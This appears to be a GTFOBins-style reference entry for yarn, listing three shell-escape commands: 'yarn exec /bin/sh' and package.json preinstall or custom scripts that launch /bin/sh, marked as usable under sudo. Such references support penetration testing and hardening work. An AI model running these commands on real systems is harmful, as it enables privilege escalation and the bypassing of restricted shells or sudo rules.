---
type: gtfobin
name: yarn
platform: Unix
functions: [shell]
tags: [gtfobin, unix, lotl]
---

# yarn

## shell

```bash
yarn exec /bin/sh
```
**Contexts:** sudo, unprivileged

```bash
echo '{"scripts": {"preinstall": "/bin/sh"}}' >package.json
yarn --cwd .
```
**Contexts:** sudo, unprivileged

```bash
echo '{"scripts": {"xxx": "/bin/sh"}}' >package.json
yarn --cwd . xxx
```
**Contexts:** sudo, unprivileged
